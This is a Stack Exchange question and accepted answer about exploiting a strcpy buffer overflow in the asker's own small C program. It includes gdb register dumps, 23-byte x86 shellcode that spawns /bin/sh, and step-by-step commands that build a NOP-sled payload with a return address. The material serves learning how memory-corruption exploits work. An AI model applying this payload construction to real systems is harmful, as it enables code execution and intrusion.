{
    "title": "Strcpy BufferOverflow get shellcode location for EIP",
    "link": "https://reverseengineering.stackexchange.com/questions/11042/strcpy-bufferoverflow-get-shellcode-location-for-eip",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  I am trying to get a shellcode, exploiting a C program with a\n  <code>\n   strcpy()\n  </code>\n  function.\n </p>\n <p>\n  I have found out that I need 68 bytes to start writing on the\n  <code>\n   EIP\n  </code>\n  . So, if I write 72's by\n  <code>\n   EIP\n  </code>\n  register is\n  <code>\n   0x41414141\n  </code>\n  .\n </p>\n <p>\n  What I want is to insert a 23 bytes shellcode for a x86 OS. So I know that I need this:\n </p>\n <ul>\n  <li>\n   68 A bytes - 23 shellcode bytes:  45\n   <code>\n    NOPs\n   </code>\n   .\n  </li>\n  <li>\n   23 bytes Shellcode.\n  </li>\n  <li>\n   4 bytes for the\n   <code>\n    EIP\n   </code>\n   register, pointing the start of the shellcode.\n  </li>\n </ul>\n <p>\n  I don't know how to carry this out. This is my program:\n </p>\n <pre><code>#include <stdio.h>\n#include <string.h>\n\nvoid cambiarEIP() {\n    printf(\"\n Has cambiado el valor del EIP, enhorabuena\n\");\n}\n\nint main(int argc, char * argv[]) {\n    char buf[64];\n\n    if(argc == 1) {\n        printf(\"Uso: %s entrada\n\", argv[0]);\n        return -1;\n    }\n\n    strcpy(buf,argv[1]);\n    printf(\"%s\n\", buf);\n\n    return 0;\n}\n</code></pre>\n <p>\n  I want to insert this as a parameter:\n  <code>\n   45As+shellcode+EIP\n  </code>\n  DIR.\n </p>\n <p>\n  This is what I get with the GDB when passing 71 bytes as a parameter:\n </p>\n <pre><code> Program received signal SIGSEGV, Segmentation fault.\n 0x00414141 in ?? ()\n</code></pre>\n <p>\n  And those are my registers:\n </p>\n <pre><code>(gdb) i r\neax            0x0  0\necx            0xb7fbc4e0   -1208236832\nedx            0xb7fbd360   -1208233120\nebx            0xb7fbbff4   -1208238092\nesp            0xbffff4a0   0xbffff4a0\nebp            0x41414141   0x41414141\nesi            0x0  0\nedi            0x0  0\neip            0x414141 0x414141\neflags         0x10246  [ PF ZF IF RF ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n</code></pre>\n <p>\n  I know that I need something like this:\n </p>\n <pre><code>./shell \\x41\\*45 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n          \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + Shellcode location\n</code></pre>\n <p>\n  How to carry this out?\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 1,
    "views": "4k",
    "tags": [
        "assembly",
        "gdb",
        "shellcode",
        "register"
    ],
    "user": "aDoN",
    "time": "Oct 12, 2015 at 12:34",
    "comments": [],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <blockquote>\n  <p>\n   68 A bytes - 23 shellcode bytes: 45 NOPs.\n  </p>\n </blockquote>\n <p>\n  NOP is the mnemonic that stands for No OPeration which is the byte \\x90, meaning that you'll have to change the A's (\\x41) for NOPs (\\x90), because \\x41 by itself it's not a valid ASM instruction in the x86 processor hence making your program crash.\n </p>\n <p>\n  Taking this into account, first part goes like:\n </p>\n <pre><code>python -c 'print \"\\x90\"*45' > payload.bin\n</code></pre>\n <blockquote>\n  <p>\n   23 bytes Shellcode\n  </p>\n </blockquote>\n <p>\n  This is self explanatory, just add your shellcode:\n </p>\n <pre><code>python -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"' >> payload.bin\n</code></pre>\n <blockquote>\n  <p>\n   4 bytes for the EIP register, pointing the start of the shellcode.\n  </p>\n </blockquote>\n <h1>\n  Here's the tricky part:\n </h1>\n <p>\n  First ask yourself a few questions:\n </p>\n <ol>\n  <li>\n   Does the system have ASLR enabled?\n  </li>\n  <li>\n   Does it have DEP enabled?\n  </li>\n  <li>\n   NX?\n  </li>\n </ol>\n <p>\n  <a href=\"https://security.stackexchange.com/questions/20497/stack-overflows-defeating-canaries-aslr-dep-nx\">\n   Read this if the answer is that you don't know\n  </a>\n </p>\n <p>\n  And if the answer to both of these is\n  <strong>\n   no\n  </strong>\n  then, continue to check into gdb the following\n </p>\n <ol>\n  <li>\n   <a href=\"https://stackoverflow.com/questions/10483544/stopping-at-the-first-machine-code-instruction-in-gdb\">\n    Set a breakpoint at program's entry point in gdb\n   </a>\n  </li>\n  <li>\n   Step in gdb until you get to the call to strcpy (id est, when the overflow happens)\n  </li>\n  <li>\n   Get the location of your\n   <em>\n    buf\n   </em>\n   variable in stack. We can do so by writing the next command in gdb since the Stack Pointer is pointing right at the beginning of\n   <em>\n    buf\n   </em>\n   <ul>\n    <li>\n     <code>\n      x/32xb $esp\n     </code>\n    </li>\n   </ul>\n  </li>\n </ol>\n <p>\n  Now that you have the location of your\n  <em>\n   buf\n  </em>\n  variable, which should be something in the form\n  <code>\n   0xbffff5f0\n  </code>\n  . Now get that memory position and add it to the end of your payload. You need this position in order to jump to the location of your\n  <em>\n   buf\n  </em>\n  variable and execute the shellcode in it...\n </p>\n <h1>\n  But hold on!\n </h1>\n <p>\n  You still have to take\n  <a href=\"https://en.wikipedia.org/wiki/Endianness\" rel=\"nofollow noreferrer\">\n   endianness\n  </a>\n  into account, which in your system is little endian.\n </p>\n <p>\n  So you'll need to write that memory position in little endian which, if you are lazy like me, you'll end up\n  <a href=\"https://github.com/n30m1nd/pyndianizer\" rel=\"nofollow noreferrer\">\n   writing a script that makes it for you\n  </a>\n  :\n </p>\n <p>\n  <code>\n   python pyndianizer.py 0xbffff5f0\n  </code>\n  ==>\n  <code>\n   \\xf0\\xf5\\xff\\xbf\n  </code>\n </p>\n <p>\n  Now, add it to your payload\n  <code>\n   python -c 'print \"\\xf0\\xf5\\xff\\xbf\"' >> payload.bin\n  </code>\n </p>\n <h1>\n  And for the grand finale:\n </h1>\n <p>\n  <code>\n   cat payload.bin | ./shell\n  </code>\n </p>\n <p>\n  If everything was done well, just press a few enters and you'll have your shell.\n </p>\n <h1>\n  Final note\n </h1>\n <p>\n  <em>\n   Your shellcode runs\n   <code>\n    /bin/sh\n   </code>\n   but just running it doesn't work sometimes because the program ends just after running your shellcode. If so, you'll have to make it wait for user input after\n   <code>\n    cat\n   </code>\n   ing the shellcode in\n  </em>\n </p>\n</div>\n</body></html>",
            "votes": "5",
            "user": "Community",
            "time": "Jun 17, 2020 at 9:54",
            "is_accepted": true,
            "comments": []
        }
    ]
}